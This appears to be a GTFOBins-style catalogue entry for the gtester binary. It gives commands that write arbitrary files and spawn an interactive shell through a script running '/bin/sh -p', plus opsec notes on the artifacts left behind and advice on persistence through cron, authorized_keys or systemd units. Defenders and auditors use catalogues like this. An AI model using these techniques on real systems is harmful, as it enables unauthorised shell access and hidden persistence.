---
name: gtester
capabilities:
- exec
- spawn
- write
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: gtester DATA -o /path/to/output-file
  notes: Data to be written appears in an XML attribute in the output file (`<testbinary path="DATA">`).
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo '#!/bin/sh -p' >/path/to/temp-file
    echo 'exec /bin/sh -p 0<&1' >>/path/to/temp-file
    chmod +x /path/to/temp-file
    gtester -q /path/to/temp-file
references:
- https://gtfobins.github.io/gtfobins/gtester/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
